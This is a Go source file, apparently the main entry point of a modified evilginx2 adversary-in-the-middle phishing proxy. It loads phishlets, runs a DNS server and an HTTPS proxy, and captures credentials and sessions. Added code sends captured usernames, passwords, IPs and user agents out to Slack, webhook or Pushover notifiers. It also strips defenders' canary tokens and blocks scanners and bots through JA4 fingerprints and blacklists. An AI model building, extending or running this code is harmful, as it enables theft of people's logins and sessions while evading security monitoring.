package main

import (
	"flag"
	"os"
	"os/user"
	"path/filepath"
	"regexp"

	"github.com/kgretzky/evilginx2/core"
	"github.com/kgretzky/evilginx2/database"
	_ "github.com/kgretzky/evilginx2/database" // ensure init
	"github.com/kgretzky/evilginx2/log"
)

var (
	phishlets_dir  = flag.String("p", "./phishlets", "Phishlets directory path")
	templates_dir  = flag.String("t", "", "HTML templates directory path")
	debug_log      = flag.Bool("debug", false, "Enable debug output")
	developer_mode = flag.Bool("developer", false, "Enable developer mode (generates self-signed certificates for all hostnames)")
	cfg_dir        = flag.String("c", "./config", "Configuration directory path")
	daemon_mode    = flag.Bool("daemon", false, "Run as headless daemon (no terminal, auto-configure from env)")
)

func joinPath(base_path, rel_path string) string {
	var ret string
	if filepath.IsAbs(rel_path) {
		ret = rel_path
	} else {
		ret = filepath.Join(base_path, rel_path)
	}
	return ret
}


func main() {
	exe_path, _ := os.Executable()
	exe_dir := filepath.Dir(exe_path)

	core.Banner()
	flag.Parse()
	if *phishlets_dir == "" {
		*phishlets_dir = joinPath(exe_dir, "./phishlets")
		if _, err := os.Stat(*phishlets_dir); os.IsNotExist(err) {
			*phishlets_dir = "/usr/share/evilginx/phishlets/"
			if _, err := os.Stat(*phishlets_dir); os.IsNotExist(err) {
				log.Fatal("you need to provide the path to directory where your phishlets are stored: ./evilginx -p <phishlets_path>")
				return
			}
		}
	}
	if *templates_dir == "" {
		*templates_dir = joinPath(exe_dir, "./templates")
		if _, err := os.Stat(*templates_dir); os.IsNotExist(err) {
			*templates_dir = "/usr/share/evilginx/templates/"
			if _, err := os.Stat(*templates_dir); os.IsNotExist(err) {
				*templates_dir = joinPath(exe_dir, "./templates")
			}
		}
	}
	if _, err := os.Stat(*phishlets_dir); os.IsNotExist(err) {
		log.Fatal("provided phishlets directory path does not exist: %s", *phishlets_dir)
		return
	}
	if _, err := os.Stat(*templates_dir); os.IsNotExist(err) {
		err = os.MkdirAll(*templates_dir, os.FileMode(0o700))
		if err != nil {
			log.Error("creating dir: %v", err)
		}
	}

	log.DebugEnable(*debug_log)
	if *debug_log {
		log.Info("debug output enabled")
	}

	phishlets_path := *phishlets_dir
	log.Info("loading phishlets from: %s", phishlets_path)

	if *cfg_dir == "" {
		usr, err := user.Current()
		if err != nil {
			log.Fatal("%v", err)
			return
		}
		*cfg_dir = filepath.Join(usr.HomeDir, ".evilginx")
	}

	config_path := *cfg_dir
	log.Info("loading configuration from: %s", config_path)

	err := os.MkdirAll(*cfg_dir, os.FileMode(0o700))
	if err != nil {
		log.Fatal("%v", err)
		return
	}

	crt_path := joinPath(*cfg_dir, "./crt")

	if err := core.CreateDir(crt_path, 0o700); err != nil { //nolint:gocritic // false positive
		log.Fatal("mkdir: %v", err)
		return
	}

	cfg, err := core.NewConfig(*cfg_dir, "")
	if err != nil {
		log.Fatal("config: %v", err)
		return
	}
	cfg.SetTemplatesDir(*templates_dir)

	db, err := database.NewDatabase(filepath.Join(*cfg_dir, "data.db"))
	if err != nil {
		log.Fatal("database: %v", err)
		return
	}
	// Mod
	core.NewAdmin(db, cfg, *cfg_dir)

	proxies := []string{}
	if cfg.GetSessionProxy() {
		proxies = core.ReadProxyList(*cfg_dir)
	}
	// End mod

	core.BOT_HOST(filepath.Join(*cfg_dir, "bot_host.txt"))
	core.BOT_UserAgent(filepath.Join(*cfg_dir, "bot_agent.txt"))
	bl, err := core.NewBlacklist(filepath.Join(*cfg_dir, "blacklist.txt"))
	if err != nil {
		log.Error("blacklist: %s", err)
		return
	}

	files, err := os.ReadDir(phishlets_path)
	if err != nil {
		log.Fatal("failed to list phishlets directory '%s': %v", phishlets_path, err)
		return
	}
	for _, f := range files {
		if f.IsDir() {
			continue
		}
		pr := regexp.MustCompile(`([a-zA-Z0-9\-.]*)\.yaml`)
		rpname := pr.FindStringSubmatch(f.Name())
		if rpname == nil || len(rpname) < 2 {
			continue
		}
		pname := rpname[1]
		if pname != "" {
			pl, err := core.NewPhishlet(pname, filepath.Join(phishlets_path, f.Name()), cfg)
			if err != nil {
				log.Error("failed to load phishlet '%s': %v", f.Name(), err)
				continue
			}
			cfg.AddPhishlet(pname, pl)
		}
	}

	ns, _ := core.NewNameserver(cfg)
	ns.Start()
	hs, _ := core.NewHttpServer()
	hs.Start()

	crt_db, err := core.NewCertDb(crt_path, cfg, ns, hs)
	if err != nil {
		log.Fatal("certdb: %v", err)
		return
	}

	hp, _ := core.NewHttpProxy("", 443, cfg, crt_db, db, bl, proxies, *developer_mode)
	err = hp.Start()
	if err != nil {
		log.Fatal("http proxy: %v", err)
		return
	}

	// Initialize Evilpuppet (browser telemetry engine)
	puppet := core.NewEvilPuppet(cfg.GetPuppetPoolSize(), cfg.GetPuppetRefreshMins())
	hp.SetPuppet(puppet)
	if cfg.IsPuppetEnabled() {
		puppet.SetEnabled(true)
		if err := puppet.Start(); err != nil {
			log.Warning("evilpuppet: %v (install chromium-browser to enable)", err)
		} else {
			log.Success("evilpuppet: browser pool started")
		}
	}

	// Initialize JA4 TLS fingerprinter (configurable via config.yaml)
	ja4 := core.NewJA4Fingerprinter()
	if cfg.IsJA4Enabled() {
		ja4BlocklistPath := filepath.Join(*cfg_dir, "ja4_blocklist.txt")
		ja4LogPath := filepath.Join(*cfg_dir, "ja4_log.txt")
		ja4.SetBlocklistPath(ja4BlocklistPath)
		ja4.SetLogPath(ja4LogPath)
		ja4.LoadBlocklist(ja4BlocklistPath)
		ja4.SetAutoBlock(cfg.IsJA4AutoBlockEnabled())
		hp.SetJA4(ja4)
		log.Info("ja4: fingerprinter active (autoblock: %v, log: %s)", cfg.IsJA4AutoBlockEnabled(), ja4LogPath)
	} else {
		log.Info("ja4: fingerprinter DISABLED via config")
	}

	// Initialize canary token stripper
	canary := core.NewCanaryStripper()
	canary.SetEnabled(cfg.IsCanaryStripEnabled())
	hp.SetCanaryStripper(canary)

	// Initialize event notifier
	notifier := core.NewNotifier()
	if url := cfg.GetNotifySlackURL(); url != "" {
		notifier.SetSlackWebhook(url)
	}
	if url := cfg.GetNotifyWebhookURL(); url != "" {
		notifier.SetWebhookURL(url)
	}
	if u, t := cfg.GetNotifyPushoverUser(), cfg.GetNotifyPushoverToken(); u != "" && t != "" {
		notifier.SetPushover(u, t)
	}
	hp.SetNotifier(notifier)

	// Wire notification callbacks into database capture events
	database.OnCredentialCaptured = func(username, password, ip, userAgent string) {
		notifier.NotifyEvent(core.EventCredentialCaptured, map[string]string{
			"username":   username,
			"password":   password,
			"ip":         ip,
			"user_agent": userAgent,
		})
	}
	database.OnSessionCaptured = func(username, password, ip, userAgent string) {
		notifier.NotifyEvent(core.EventSessionCaptured, map[string]string{
			"username":   username,
			"password":   password,
			"ip":         ip,
			"user_agent": userAgent,
		})
	}

	// Initialize URL rewriter
	rewriter := core.NewURLRewriter()
	rewriter.SetEnabled(cfg.IsURLRewriteEnabled())
	hp.SetURLRewriter(rewriter)

	if *daemon_mode {
		// Daemon mode: auto-configure from environment, no terminal
		log.Info("running in daemon mode (headless)")
		core.DaemonAutoConfig(cfg, crt_db, db, hp)
		// Block forever — systemd manages lifecycle
		select {}
	} else {
		t, err := core.NewTerminal(hp, cfg, crt_db, db, *developer_mode)
		if err != nil {
			log.Fatal("%v", err)
			return
		}
		t.SetPuppet(puppet)
		t.SetNotifier(notifier)
		t.SetCanaryStripper(canary)
		t.SetURLRewriter(rewriter)
		t.SetJA4(ja4)
		t.DoWork()
	}
}
